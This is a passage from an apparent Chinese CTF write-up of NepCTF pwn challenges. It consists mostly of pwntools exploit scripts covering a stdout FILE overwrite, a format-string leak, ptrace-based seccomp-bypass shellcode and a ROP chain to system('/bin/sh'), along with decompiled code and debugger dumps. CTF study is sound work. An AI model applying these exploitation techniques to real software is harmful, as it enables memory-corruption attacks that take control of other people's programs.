07:0038│  0x405038 (std::istream::operator>>(int&)@got.plt) —▸ 0x7ffff7d2c3e0 (std::istream::operator>>(int&)) ◂— endbr64 
08:0040│  0x405040 (memcpy@got[plt]) —▸ 0x401080 ◂— endbr64 
09:0048│  0x405048 (perror@got[plt]) —▸ 0x401090 ◂— endbr64 
0a:0050│  0x405050 (__cxa_atexit@got.plt) —▸ 0x7ffff78458c0 (__cxa_atexit) ◂— endbr64 
0b:0058│  0x405058 (std::basic_ostream<char, std::char_traits<char> >& std::operator<< <std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, charconst*)@got.plt) —▸ 0x7ffff7d49660 (std::basic_ostream<char, std::char_traits<char> >& std::operator<< <std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, charconst*)) ◂— endbr64 
0c:0060│  0x405060 (std::ostream::operator<<(std::ostream& (*)(std::ostream&))@got.plt) —▸ 0x7ffff7d47fe0 (std::ostream::operator<<(std::ostream& (*)(std::ostream&))) ◂— endbr64 
0d:0068│  0x405068 (__stack_chk_fail@got.plt) —▸ 0x4010d0 ◂— endbr64 
0e:0070│  0x405070 (__isoc99_scanf@got.plt) —▸ 0x4010e0 ◂— endbr64 
0f:0078│  0x405078 (fopen@got[plt]) —▸ 0x7ffff787f6b0 (fopen64) ◂— endbr64 
10:0080│  0x405080 (exit@got[plt]) —▸ 0x401100 ◂— endbr64 
11:0088│  0x405088 (malloc@got[plt]) —▸ 0x401110 ◂— endbr64 
12:0090│  0x405090 (read@got[plt]) —▸ 0x401120 ◂— endbr64 
13:0098│  0x405098 (std::ios_base::Init::Init()@got.plt) —▸ 0x7ffff7cc8c10 (std::ios_base_library_init()) ◂— endbr64 
14:00a0│  0x4050a0 (seccomp_rule_add@got[plt]) —▸ 0x7ffff7f97800 (seccomp_rule_add) ◂— endbr64 
15:00a8│  0x4050a8 (fgets@got[plt]) —▸ 0x7ffff787f400 (fgets) ◂— endbr64 
16:00b0│  0x4050b0 (__cxa_end_catch@got.plt) —▸ 0x401160 ◂— endbr64 
17:00b8│  0x4050b8 (__cxa_throw@got.plt) —▸ 0x401170 ◂— endbr64 
18:00c0│  0x4050c0 (_Unwind_Resume@got.plt) —▸ 0x401180 ◂— endbr64 
19:00c8│  0x4050c8 (seccomp_init@got[plt]) —▸ 0x7ffff7f963e0 (seccomp_init) ◂— endbr64 
1a:00d0│  0x4050d0 (seccomp_load@got[plt]) —▸ 0x7ffff7f96c50 (seccomp_load) ◂— endbr64 
1b:00d8│  0x4050d8 (close@got[plt]) —▸ 0x4011b0 ◂— endbr64 
1c:00e0│  0x4050e0 ◂— 0
1d:00e8│  0x4050e8 ◂— 0
1e:00f0│  0x4050f0 —▸ 0x404db8 (typeinfo for char const*) —▸ 0x7ffff7e5db70 (vtable for __cxxabiv1::__pointer_type_info+16) —▸ 0x7ffff7cb7a40 (__cxxabiv1::__pointer_type_info::~__pointer_type_info()) ◂— endbr64 
1f:00f8│  0x4050f8 —▸ 0x7ffff7cb6420 (__gxx_personality_v0) ◂— endbr64 
20:0100│  0x405100 (stdout) —▸ 0x7ffff7a1a780 (_IO_2_1_stdout_) ◂— 0xfbad2887
21:0108│  0x405108 ◂— 0
22:0110│  0x405110 (stdin) —▸ 0x7ffff7a19aa0 (_IO_2_1_stdin_) ◂— 0xfbad208b
23:0118│  0x405118 ◂— 0
... ↓     4 skipped
28:0140│  0x405140 (std::cout) —▸ 0x7ffff7e63310 (vtable for std::ostream+24) —▸ 0x7ffff7d47cb0 (std::basic_ostream<char, std::char_traits<char> >::~basic_ostream()) ◂— endbr64 
29:0148│  0x405148 (std::cout+8) —▸ 0x7ffff7e63338 (vtable for std::ostream+64) —▸ 0x7ffff7d47cf0 (virtual thunk to std::basic_ostream<char, std::char_traits<char> >::~basic_ostream()) ◂— endbr64 
2a:0150│  0x405150 (std::cout+16) ◂— 6
2b:0158│  0x405158 (std::cout+24) ◂— 0
2c:0160│  0x405160 (std::cout+32) ◂— 0x1002
2d:0168│  0x405168 (std::cout+40) ◂— 0
... ↓     2 skipped
30:0180│  0x405180 (std::cout+64) ◂— 0
... ↓     7 skipped
38:01c0│  0x4051c0 (std::cout+128) ◂— 0
... ↓     7 skipped
40:0200│  0x405200 (std::cout+192) ◂— 0
41:0208│  0x405208 (std::cout+200) ◂— 8
42:0210│  0x405210 (std::cout+208) —▸ 0x405188 (std::cout+72) ◂— 0
43:0218│  0x405218 (std::cout+216) —▸ 0x7ffff7e6ae20 ◂— 2
44:0220│  0x405220 (std::cout+224) ◂— 0
45:0228│  0x405228 (std::cout+232) ◂— 0
46:0230│  0x405230 (std::cout+240) —▸ 0x7ffff7e68ea0 —▸ 0x7ffff7e61a08 (vtable for __gnu_cxx::stdio_sync_filebuf<char, std::char_traits<char> >+16) —▸ 0x7ffff7d1de80 (__gnu_cxx::stdio_sync_filebuf<char, std::char_traits<char> >::~stdio_sync_filebuf()) ◂— endbr64 
47:0238│  0x405238 (std::cout+248) —▸ 0x7ffff7e6a840 —▸ 0x7ffff7e5f160 (vtable for std::ctype<char>+16) —▸ 0x7ffff7ce0780 (std::ctype<char>::~ctype()) ◂— endbr64 
48:0240│  0x405240 (std::cout+256) —▸ 0x7ffff7e6a7d0 —▸ 0x7ffff7e62d78 (vtable for std::num_put<char, std::ostreambuf_iterator<char, std::char_traits<char> > >+16) —▸ 0x7ffff7d33170 (std::num_put<char, std::ostreambuf_iterator<char, std::char_traits<char> > >::~num_put()) ◂— endbr64 
49:0248│  0x405248 (std::cout+264) —▸ 0x7ffff7e6a7e0 —▸ 0x7ffff7e62d00 (vtable for std::num_get<char, std::istreambuf_iterator<char, std::char_traits<char> > >+16) —▸ 0x7ffff7d33150 (std::num_get<char, std::istreambuf_iterator<char, std::char_traits<char> > >::~num_get()) ◂— endbr64 
4a:0250│  0x405250 ◂— 0
4b:0258│  0x405258 ◂— 0
4c:0260│  0x405260 (stderr) —▸ 0x7ffff7a1a6a0 (_IO_2_1_stderr_) ◂— 0xfbad2087
4d:0268│  0x405268 ◂— 0
... ↓     2 skipped
50:0280│  0x405280 (std::cin) —▸ 0x7ffff7e62870 (vtable for std::istream+24) —▸ 0x7ffff7d2b830 (std::basic_istream<char, std::char_traits<char> >::~basic_istream()) ◂— endbr64 
51:0288│  0x405288 (std::cin+8) ◂— 0
52:0290│  0x405290 (std::cin+16) —▸ 0x7ffff7e62898 (vtable for std::istream+64) —▸ 0x7ffff7d2b870 (virtual thunk to std::basic_istream<char, std::char_traits<char> >::~basic_istream()) ◂— endbr64 
53:0298│  0x405298 (std::cin+24) ◂— 6
54:02a0│  0x4052a0 (std::cin+32) ◂— 0
55:02a8│  0x4052a8 (std::cin+40) ◂— 0x1002
56:02b0│  0x4052b0 (std::cin+48) ◂— 0
57:02b8│  0x4052b8 (std::cin+56) ◂— 0
58:02c0│  0x4052c0 (std::cin+64) ◂— 0
... ↓     7 skipped
60:0300│  0x405300 (std::cin+128) ◂— 0
... ↓     7 skipped
68:0340│  0x405340 (std::cin+192) ◂— 0
69:0348│  0x405348 (std::cin+200) ◂— 0
6a:0350│  0x405350 (std::cin+208) ◂— 8
6b:0358│  0x405358 (std::cin+216) —▸ 0x4052d0 (std::cin+80) ◂— 0
6c:0360│  0x405360 (std::cin+224) —▸ 0x7ffff7e6ae20 ◂— 2
6d:0368│  0x405368 (std::cin+232) —▸ 0x405140 (std::cout) —▸ 0x7ffff7e63310 (vtable for std::ostream+24) —▸ 0x7ffff7d47cb0 (std::basic_ostream<char, std::char_traits<char> >::~basic_ostream()) ◂— endbr64 
6e:0370│  0x405370 (std::cin+240) ◂— 0
6f:0378│  0x405378 (std::cin+248) —▸ 0x7ffff7e68e40 —▸ 0x7ffff7e61a08 (vtable for __gnu_cxx::stdio_sync_filebuf<char, std::char_traits<char> >+16) —▸ 0x7ffff7d1de80 (__gnu_cxx::stdio_sync_filebuf<char, std::char_traits<char> >::~stdio_sync_filebuf()) ◂— endbr64 
pwndbg> 
70:0380│  0x405380 (std::cin+256) —▸ 0x7ffff7e6a840 —▸ 0x7ffff7e5f160 (vtable for std::ctype<char>+16) —▸ 0x7ffff7ce0780 (std::ctype<char>::~ctype()) ◂— endbr64 
71:0388│  0x405388 (std::cin+264) —▸ 0x7ffff7e6a7d0 —▸ 0x7ffff7e62d78 (vtable for std::num_put<char, std::ostreambuf_iterator<char, std::char_traits<char> > >+16) —▸ 0x7ffff7d33170 (std::num_put<char, std::ostreambuf_iterator<char, std::char_traits<char> > >::~num_put()) ◂— endbr64 
72:0390│  0x405390 (std::cin+272) —▸ 0x7ffff7e6a7e0 —▸ 0x7ffff7e62d00 (vtable for std::num_get<char, std::istreambuf_iterator<char, std::char_traits<char> > >+16) —▸ 0x7ffff7d33150 (std::num_get<char, std::istreambuf_iterator<char, std::char_traits<char> > >::~num_get()) ◂— endbr64 
73:0398│  0x405398 ◂— 0
74:03a0│  0x4053a0 —▸ 0x4182b0 ◂— 0xfbad2488
75:03a8│  0x4053a8 ◂— 0
76:03b0│  0x4053b0 —▸ 0x4194a0 ◂— 0xa1b2c3d4
77:03b8│  0x4053b8 ◂— 0
78:03c0│  0x4053c0 ◂— 'flag{aaaa}n'
79:03c8│  0x4053c8 ◂— 0xa7d61 /* 'a}n' */
7a:03d0│  0x4053d0 ◂— 0

from pwn import *
io=process('./pwn')
#io=remote("nepctf32-5vso-tlka-yawl-vfhkgz1bo235.nepctf.com",443,ssl=True,sni="nepctf32-5vso-tlka-yawl-vfhkgz1bo235.nepctf.com")
libc=ELF('./libc.so.6')
def ch(Id):
    io.sendlineafter(b"your choice >>",str(Id).encode())
def add(size):
    ch(1)
    ch(2)
    io.sendlineafter(b"size:",str(size).encode())
    ch(1)
    ch(1)
def edit(Id,payload):
    ch(1)
    ch(3)
    io.sendlineafter(b"index:",str(Id).encode())
    io.sendafter(b"content:",payload)
def bug():
    gdb.attach(io)

add(0x200)
payload=b'a'*0x20+p64(0x405338+0x2c-4)+p64(0x401F0B)#x+0x2c-8 
edit(0,payload)
ch(2)
io.sendlineafter(b"index:",str(0).encode())
io.recvuntil(b"setbufaddr:")
base=int(io.recvline()[:-1],16)-0x88060
success(f"base=>{hex(base)}")
_IO_2_1_stdout=base+0x21a780

ch(1)
ch(3)
io.sendlineafter(b"index:",str(-70).encode())
payload=p8(0)*0x80+p64(8)+p64(_IO_2_1_stdout)
io.send(payload)

ch(1)
ch(3)
io.sendlineafter(b"index:",str(-70).encode())
payload=p64(0xfbad1800)+p64(0)*3+p64(0x4053C0)+p64(0x4053C0+0x400)*2
io.send(payload)

from pwn import *
io=process('./pwn')
#io=remote("nepctf32-5vso-tlka-yawl-vfhkgz1bo235.nepctf.com",443,ssl=True,sni="nepctf32-5vso-tlka-yawl-vfhkgz1bo235.nepctf.com")
libc=ELF('./libc.so.6')
def ch(Id):
    io.sendlineafter(b"your choice >>",str(Id).encode())
def add(size):
    ch(1)
    ch(2)
    io.sendlineafter(b"size:",str(size).encode())
    ch(1)
    ch(1)
def edit(Id,payload):
    ch(1)
    ch(3)
    io.sendlineafter(b"index:",str(Id).encode())
    io.sendafter(b"content:",payload)
def bug():
    gdb.attach(io)
add(0x200)
payload=b'a'*0x20+p64(0x405338+0x2c-4)+p64(0x401F0B)#x+0x2c-8 
edit(0,payload)
ch(2)
io.sendlineafter(b"index:",str(0).encode())
io.recvuntil(b"setbufaddr:")
base=int(io.recvline()[:-1],16)-0x88060
success(f"base=>{hex(base)}")
_IO_2_1_stdout=base+0x21a780
ch(1)
ch(3)
io.sendlineafter(b"index:",str(-70).encode())
payload=p8(0)*0x80+p64(8)+p64(_IO_2_1_stdout)
io.send(payload)
#bug()
ch(1)
ch(3)
io.sendlineafter(b"index:",str(-70).encode())
payload=p64(0xfbad1800)+p64(0)*3+p64(0x4053C0)+p64(0x4053C0+0x400)*2
io.send(payload)
io.interactive()

看雪ID：zer00ne

https://bbs.kanxue.com/user-home-1024538.htm

*本文为看雪论坛优秀文章，由 zer00ne 原创，转载请注明来自看雪社区

1.25折门票即将售罄

看雪·第九届安全开发者峰会（SDC 2025）

# 往期推荐

无”痕”加载驱动模块之傀儡驱动 (上)

为 CobaltStrike 增加 SMTP Beacon

隐蔽通讯常见种类介绍

buuctf-re之CTF分析

物理读写/无附加读写实验

球分享

球点赞

球在看

点击阅读原文查看更多


```
unsigned __int64 input_my_name(){
char *argv[5]; // [rsp+10h] [rbp-30h] BYREF
unsigned __int64 v2; // [rsp+38h] [rbp-8h]

  v2 = __readfsqword(0x28u);
puts("please input your name:");
  __isoc99_scanf("%100s", name);
puts("I will tell you all file names in the current directory!");
  argv[0] = "/bin/ls";
  argv[1] = "/";
  argv[2] = "-al";
  argv[3] = 0LL;
if ( !fork() )
execve("/bin/ls", argv, 0LL);
wait(0LL);
puts("good luck :-)");
return v2 - __readfsqword(0x28u);
}
```



```
__int64 input_filename(){
puts("input file name you want to read:");
  __isoc99_scanf("%s", file);
if ( !strstr(file, "flag") )
return 1LL;
puts("flag is not allowed!");
return 0LL;
}
```



```
unsigned __int64 __fastcall work(void *a1){
unsignedint v1; // eax
int i; // [rsp+4h] [rbp-46Ch]
int j; // [rsp+8h] [rbp-468h]
int fd; // [rsp+Ch] [rbp-464h]
char v6[96]; // [rsp+10h] [rbp-460h] BYREF
char v7[16]; // [rsp+70h] [rbp-400h] BYREF
char buf[1000]; // [rsp+80h] [rbp-3F0h] BYREF
unsigned __int64 v9; // [rsp+468h] [rbp-8h]

  v9 = __readfsqword(0x28u);
md5_1_(v6);
  v1 = strlen(file);
md5_2_(v6, file, v1);
md5_3_(v6, v7);
puts("I will tell you last file name content in md5:");
for ( i = 0; i <= 15; ++i )
printf("%02X", (unsigned __int8)v7[i]);
putchar(10);
for ( j = 0; j <= 999; ++j )
    buf[j] = 0;
  fd = open(file, 0);
if ( fd >= 0 )
  {
read(fd, buf, 0x3E8uLL);
close(fd);
printf("hello ");
printf(name);
puts(" ,your file read done!");
  }
else
  {
puts("file not found!");
  }
return v9 - __readfsqword(0x28u);
}
```



```
from pwn import *
#io=process('./pwn')
context.log_level='debug'
io=remote("nepctf32-1ris-vabv-sri2-p9kvlhq2i224.nepctf.com",443,ssl=True,sni="nepctf32-1ris-vabv-sri2-p9kvlhq2i224.nepctf.com")
def bug():
    gdb.attach(io)
name=f"%{12+9}$p".encode()
for  i in range(0x10):
    name+=f"-%{13+9+i}$p".encode()
io.sendlineafter(b"please input your name:n",name)
file=b"time"
io.sendlineafter(b"input file name you want to read:n",file)
io.sendlineafter(b"input file name you want to read:n",b"flag")

io.interactive()
```



```
def hex_to_string(hex_list):
    result = b""
for val in hex_list:
        num = int(val, 16)
# 计算需要多少字节表示这个数
        byte_len = (num.bit_length() + 7) // 8
# 转换为字节串（小端）
        b = num.to_bytes(byte_len, byteorder='little')
        result += b
return result.decode(errors='replace')  # errors='replace' 防止乱码崩溃

hex_data = [
"0x2bc422698ba00f71",
"0x627b46544370654e",
"0x2d31376661383262",
"0x3162372d66323762",
"0x382d363633612d64",
"0x3632326534363763",
"0xa7d353564"
]

print(hex_to_string(hex_data))

#q��i"�+NepCTF{bb28af71-b72f-7b1d-a366-8c764e226d55}
```



```
int __fastcall main(int argc, constchar **argv, constchar **envp){
__pid_t pid; // [rsp+4h] [rbp-Ch]

setbuf(stdin, 0LL);
setbuf(stdout, 0LL);
setbuf(stderr, 0LL);
if ( mmap((void *)0xDEADC0DE000LL, 0x1000uLL, 7, 50, -1, 0LL) == (void *)0xDEADC0DE000LL )
  {
puts("[+] please input your shellcode: ");
    pid = fork();
if ( pid < 0 )
    {
perror("fork");
exit(1);
    }
if ( !pid )
    {
while ( 1 )
        ;
    }
read(0, (void *)0xDEADC0DE000LL, 0x1000uLL);
install_seccomp();
    MEMORY[0xDEADC0DE000]();
return 0;
  }
else
  {
perror("mmap");
return 1;
  }
}
```



```
line  CODE  JT   JF      K
=================================
0000:0x20 0x00 0x00 0x00000000  A = sys_number
0001:0x15 0x00 0x01 0x00000065  if (A !=ptrace) goto 0003
0002:0x06 0x00 0x00 0x7fff0000  return ALLOW
0003:0x06 0x00 0x00 0x00000000  return KILL
```



```
#include <sys/ptrace.h>
longptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data);
```



```
from pwn import *
#io=process('./pwn')
io=remote("nepctf32-infg-wkc9-bblj-arh6h95nc659.nepctf.com",443,ssl=True,sni="nepctf32-infg-wkc9-bblj-arh6h95nc659.nepctf.com")
context.arch='amd64'
context.log_level='debug'
def bug():
    gdb.attach(io,"b read")
io.recvuntil(b"[+] please input your shellcode: ")
shellcode =asm("mov r14d, DWORD PTR [rbp-0xc]")
print("已获得子进程pid")
"""orw
0xdeadc0de000:	0x010101010101b848	0x672e2fb848500101
0xdeadc0de010:	0x043148010166606d	0xf631d231e7894824
0xdeadc0de020:	0x01ba41050f58026a	0x0301f28141010102
0xdeadc0de030:	0x6ad2315f016a0101	0x00050f58286a5e03
"""
shellcode+=asm(shellcraft.ptrace(16,"r14"))
shellcode+=asm('''
    mov rcx,0x500000000
loop:
    sub rcx,1
    test rcx,rcx
    jnz loop
        ''')
print("进程附加成功")
shellcode+=asm(shellcraft.ptrace(12,"r14",0,0xDEADC0DE000+0x500))
shellcode+=asm("mov rsp,0xDEADC0DE588;mov rax, 0xDEADC0DE000;push rax;mov rsp,0xDEADC0DE800")
shellcode+=asm(shellcraft.ptrace(5, "r14", 0xDEADC0DE000,0x010101010101b848))
shellcode+=asm(shellcraft.ptrace(5, "r14", 0xDEADC0DE000+8,0x672e2fb848500101))
shellcode+=asm(shellcraft.ptrace(5, "r14", 0xDEADC0DE000+0x10,0x043148010166606d))
shellcode+=asm(shellcraft.ptrace(5, "r14", 0xDEADC0DE000+0x18,0xf631d231e7894824))
shellcode+=asm(shellcraft.ptrace(5, "r14", 0xDEADC0DE000+0x20,0x01ba41050f58026a))
shellcode+=asm(shellcraft.ptrace(5, "r14", 0xDEADC0DE000+0x28,0x0301f28141010102))
shellcode+=asm(shellcraft.ptrace(5, "r14", 0xDEADC0DE000+0x30,0x6ad2315f016a0101))
shellcode+=asm(shellcraft.ptrace(5, "r14", 0xDEADC0DE000+0x38,0x00050f58286a5e03))
#================================================================================================================
shellcode+=asm(shellcraft.ptrace(13,"r14",0,0xDEADC0DE000+0x500))
#================================================================================================================
shellcode+=asm(shellcraft.ptrace(17,"r14", 0, 0))
shellcode+=asm("jmp $")
io.send(shellcode)
io.interactive()
```



```
int __fastcall __noreturn main(int argc, constchar **argv, constchar **envp){
int v3; // [rsp+Ch] [rbp-14h] BYREF
  __int64 v4; // [rsp+10h] [rbp-10h]
unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
initstream(argc, argv, envp);
  v3 = 0;
  v4 = init();
while ( 1 )
  {
puts("Which permission do you want to log in with?(1:manager 1000:user)");
    __isoc99_scanf("%d", &v3);
puts("What action do you want to take?");
if ( v3 == 1 )
    {
manager_operation(v4);
    }
else if ( v3 == 1000 )
    {
user_operation();
    }
  }
}
```



```
00000000 usr_chunk       struc ; (sizeof=0x18, mappedto_8)
00000000 chunk           dq ?  //堆地址
00000008 right           dq ?  //权限
00000010 operat_code     dq ?  //操作码
```



```
__int64 init(){
int i; // [rsp+Ch] [rbp-14h]
void *v2; // [rsp+10h] [rbp-10h]
  __int64 v3; // [rsp+18h] [rbp-8h]

  v2 = malloc(0x2000uLL);
  chunk_list[0] = (__int64)v2;
  right_list[0] = 0x10;
for ( i = 1; i <= 19; ++i )                   //right_mark
  {
    chunk_list[2 * i] = (__int64)v2 + 0x100 * i;
if ( i > 9 )
      right_list[4 * i] = 3;                    // usr
else
      right_list[4 * i] = 2;                    // manage
  }
  onlyuser = 1000;
  operat_chunk = (usr_chunk *)malloc(0x18uLL);
LODWORD(operat_chunk->operat_code) = 0;
  operat_chunk->chunk = 0LL;
LODWORD(operat_chunk->right) = 0;
  v3 = chunk_list[0];
  *(_DWORD *)chunk_list[0] = 1;
  *(_QWORD *)(v3 + 0x10) = &onlyuser;
  *(_QWORD *)(v3 + 8) = malloc(0x18uLL);
  *(_DWORD *)(*(_QWORD *)(v3 + 8) + 16LL) = 0;
  **(_QWORD **)(v3 + 8) = 0LL;
  *(_DWORD *)(*(_QWORD *)(v3 + 8) + 8LL) = 0;
return v3;
}
```



```
ssize_tuser_operation(){
ssize_t result; // rax
signedint v1; // [rsp+Ch] [rbp-24h] BYREF
char s[24]; // [rsp+10h] [rbp-20h] BYREF
unsigned __int64 v3; // [rsp+28h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  v1 = 0;
memset(s, 0, 0x10uLL);
puts("user read from logs(USER_read)");
puts("user write to logs(USER_write)");
read(0, s, 0xFuLL);
puts("Which storage area do you want to operate on?");
puts("10-19: user can visit");
  __isoc99_scanf("%d", &v1);
if ( (unsignedint)check(v1, s, 1000) )
  {
    operat_chunk->chunk = chunk_list[2 * v1];
LODWORD(operat_chunk->right) = right_list[4 * v1];
permission_confirm((__int64)operat_chunk, s);
if ( LODWORD(operat_chunk->operat_code) == 1 )
    {
return read(0, (void *)operat_chunk->chunk, 0xFFuLL);// "USER_write"
    }
else
    {
      result = LODWORD(operat_chunk->operat_code);
if ( (_DWORD)result == 4 )
return write(1, (constvoid *)operat_chunk->chunk, 0xFFuLL);// "USER_read"
    }
  }
else
  {
puts("permission denied");
return 0xFFFFFFFFLL;
  }
return result;
}
```



```
__int64 __fastcall check(unsignedint Id, constchar *s, int a3){
  __int64 *v5; // [rsp+18h] [rbp-8h]

if ( Id >= 20 )                 
return 0LL;
if ( strcmp(s, "MANAGER_visit")
    && strcmp(s, "MANAGER_read")
    && strcmp(s, "MANAGER_write")
    && strcmp(s, "USER_read")
    && strcmp(s, "USER_write") )
  {
return 0LL;
  }
  v5 = &chunk_list[2 * (int)Id];
if ( a3 == 1000 )
  {
if ( !strcmp(s, "USER_write") && (v5[1] & 1) == 0 )
return 0LL;
  }
else if ( !strcmp(s, "MANAGER_write") )
  {
if ( (v5[1] & 2) == 0 )
return 0LL;
  }
else if ( !strcmp(s, "MANAGER_visit") && !operat_chunk->chunk )
  {
return 0LL;
  }
return 1LL;
}
```



```
int __fastcall permission_confirm(__int64 a1, constchar *a2){
int result; // eax

if ( !strcmp(a2, "MANAGER_visit") )
  {
    result = a1;
    *(_DWORD *)(a1 + 0x10) = 8;
  }
else if ( !strcmp(a2, "MANAGER_read") )
  {
    result = a1;
    *(_DWORD *)(a1 + 0x10) = 4;
  }
else if ( !strcmp(a2, "MANAGER_write") )
  {
    result = a1;
    *(_DWORD *)(a1 + 0x10) = 2;
  }
else if ( !strcmp(a2, "USER_read") )
  {
    result = a1;
    *(_DWORD *)(a1 + 0x10) = 4;
  }
else
  {
    result = strcmp(a2, "USER_write");
if ( !result )
    {
      result = a1;
      *(_DWORD *)(a1 + 0x10) = 1;
    }
  }
return result;
}
```



```
ssize_t __fastcall manager_operation(__int64 a1){
ssize_t result; // rax
int v2; // [rsp+18h] [rbp-28h] BYREF
signedint Id; // [rsp+1Ch] [rbp-24h] BYREF
char s[24]; // [rsp+20h] [rbp-20h] BYREF
unsigned __int64 v5; // [rsp+38h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  v2 = 0;
  Id = 0;
memset(s, 0, 0x10uLL);
puts("manager read from logs(MANAGER_read)");
puts("manager write to logs(MANAGER_write)");
puts("visit user(MANAGER_visit)");
read(0, s, 0xFuLL);                           // "MANAGER_visit"
// "MANAGER_read"
// "MANAGER_write"
puts("Which storage area do you want to operate on?");
puts("1-19: manager can visit");
  __isoc99_scanf("%d", &Id);
if ( !(unsignedint)check(Id, s, 1) )
  {
puts("permission denied");
return 0xFFFFFFFFLL;
  }
  **(_QWORD **)(a1 + 8) = chunk_list[2 * Id];
  *(_DWORD *)(*(_QWORD *)(a1 + 8) + 8LL) = right_list[4 * Id];
permission_confirm(*(_QWORD *)(a1 + 8), s);
if ( *(_DWORD *)(*(_QWORD *)(a1 + 8) + 0x10LL) == 8 )// "MANAGER_visit"
  {
puts("1: manager visit user to read from user_logs");
puts("2: manager visit user to write to user_logs");
    __isoc99_scanf("%d", &v2);
if ( !checkvisit(v2) )
    {
puts("permission denied visit");
return 0xFFFFFFFFLL;
    }
if ( v2 == 1 )
    {
      *(_DWORD *)(*(_QWORD *)(a1 + 8) + 0x10LL) = 6;
    }
else if ( v2 == 2 )
    {
      *(_DWORD *)(*(_QWORD *)(a1 + 8) + 0x10LL) = 3;
    }
  }
switch ( *(_DWORD *)(*(_QWORD *)(a1 + 8) + 0x10LL) )
  {
case 6:
return write(1, **(constvoid ***)(*(_QWORD *)(a1 + 0x10) + 8LL), 0xFFuLL);// "1: manager visit user to read from user_logs"
case 3:
return read(0, **(void ***)(*(_QWORD *)(a1 + 0x10) + 8LL), 0xFFuLL);// "2: manager visit user to write to user_logs"
case 4:
return write(1, **(constvoid ***)(a1 + 8), 0xFFuLL);// "MANAGER_read"
  }
  result = *(unsignedint *)(*(_QWORD *)(a1 + 8) + 0x10LL);
if ( (_DWORD)result == 2 )                    // "MANAGER_write"
return read(0, **(void ***)(a1 + 8), 0xFFuLL);
return result;
}
```



```
_BOOL8 __fastcall checkvisit(int a1){
if ( a1 == 1 )
return 1LL;
return a1 != 2 || (operat_chunk->operat_code & 4) == 0;
}
```



```
from pwn import *
io=process('./pwn')
#io=remote("nepctf32-nhc3-ipgm-a41k-fqjcvtlc0394.nepctf.com",443,ssl=True,sni="nepctf32-nhc3-ipgm-a41k-fqjcvtlc0394.nepctf.com")
libc=ELF('libc.so.6')
def bug():
    gdb.attach(io)
def ch(Id):
    io.sendlineafter(b"(1:manager 1000:user)n",str(Id).encode())
def usr_write(Id,payload):
    ch(1000)
    io.sendafter(b"user write to logs(USER_write)n",b"USER_write")
    io.sendlineafter(b"10-19: user can visitn",str(Id).encode())
    io.send(payload)
def usr_read(Id):
    ch(1000)
    io.sendafter(b"user write to logs(USER_write)n",b"USER_read")
    io.sendlineafter(b"10-19: user can visitn",str(Id).encode())
def man_write(Id,payload):
    ch(1)
    io.sendafter(b"visit user(MANAGER_visit)n",b"MANAGER_write")
    io.sendlineafter(b"1-19: manager can visit",str(Id).encode())
    io.send(payload)
def man_read(Id):
    ch(1)
    io.sendafter(b"visit user(MANAGER_visit)n",b"MANAGER_read")
    io.sendlineafter(b"1-19: manager can visit",str(Id).encode())
def man_write_usr(Id,payload):
    ch(1)
    io.sendafter(b"visit user(MANAGER_visit)n",b"MANAGER_visit")
    io.sendlineafter(b"1-19: manager can visit",str(Id).encode())
    io.sendlineafter(b"2: manager visit user to write to user_logs",b"2")
    io.send(payload)
def man_read_usr(Id):
    ch(1)
    io.sendafter(b"visit user(MANAGER_visit)n",b"MANAGER_visit")
    io.sendlineafter(b"1-19: manager can visit",str(Id).encode())
    io.sendlineafter(b"2: manager visit user to write to user_logs",b"1")
```



```
man_read(0)
io.recvuntil(b"x01x00x00x00x00x00x00x00")
heap=u64(io.recv(8))-0x22d0
pie=u64(io.recv(8))-0x41a0
print(f"heap=>{hex(heap)}")
print(f"pie=>{hex(pie)}")
```



```
def get_right():
ch(1000)
    io.sendafter(b"user write to logs(USER_write)n",b"MANAGER_visit")
    io.sendlineafter(b"10-19: user can visitn",str(0).encode())
```



```
usr_write(10,b'a'*0x50)
get_right()
head=heap+0x2a0#即chank[0]的地址
```



```
man_write_usr(0,p64(0)+p64(heap+0x22d0)+p64(head+0x18)+p64(head+0x20)+p64(head+0x28)+p64(pie+0x4068))
man_write_usr(0,p64(0xf))#修改权限
```



```
man_write(0,p64(0)+p64(heap+0x22d0)+p64(head+0x18)+p64(head+0x20)+p64(head+0x28)+p64(pie+0x4020))
man_read_usr(0)
io.recvline()
#===
base=u64(io.recv(8))-0x21b780
print(f"base=>{hex(base)}")
```



```
stack=base+libc.sym.environ
man_write(0,p64(0)+p64(heap+0x22d0)+p64(head+0x18)+p64(head+0x20)+p64(head+0x28)+p64(stack))
man_read_usr(0)
io.recvline()
stack=u64(io.recv(8))
print(f"stack=>{hex(stack)}")
```



```
man_write(0,p64(0)+p64(heap+0x22d0)+p64(head+0x18)+p64(head+0x20)+p64(head+0x28)+p64(stack-0x150))
#-0x150
rdi=base+0x000000000002a3e5
system=base+0x50d70
bin_sh=base+0x00000000001d8678

payload=p64(rdi+1)+p64(rdi)+p64(bin_sh)+p64(system)
man_write_usr(0,payload)

io.interactive()
```



```
from pwn import *
io=process('./pwn')
#io=remote("nepctf32-nhc3-ipgm-a41k-fqjcvtlc0394.nepctf.com",443,ssl=True,sni="nepctf32-nhc3-ipgm-a41k-fqjcvtlc0394.nepctf.com")
libc=ELF('libc.so.6')
def bug():
    gdb.attach(io)
def ch(Id):
    io.sendlineafter(b"(1:manager 1000:user)n",str(Id).encode())
def usr_write(Id,payload):
    ch(1000)
    io.sendafter(b"user write to logs(USER_write)n",b"USER_write")
    io.sendlineafter(b"10-19: user can visitn",str(Id).encode())
    io.send(payload)
def usr_read(Id):
    ch(1000)
    io.sendafter(b"user write to logs(USER_write)n",b"USER_read")
    io.sendlineafter(b"10-19: user can visitn",str(Id).encode())
def man_write(Id,payload):
    ch(1)
    io.sendafter(b"visit user(MANAGER_visit)n",b"MANAGER_write")
    io.sendlineafter(b"1-19: manager can visit",str(Id).encode())
    io.send(payload)
def man_read(Id):
    ch(1)
    io.sendafter(b"visit user(MANAGER_visit)n",b"MANAGER_read")
    io.sendlineafter(b"1-19: manager can visit",str(Id).encode())
def man_write_usr(Id,payload):
    ch(1)
    io.sendafter(b"visit user(MANAGER_visit)n",b"MANAGER_visit")
    io.sendlineafter(b"1-19: manager can visit",str(Id).encode())
    io.sendlineafter(b"2: manager visit user to write to user_logs",b"2")
    io.send(payload)
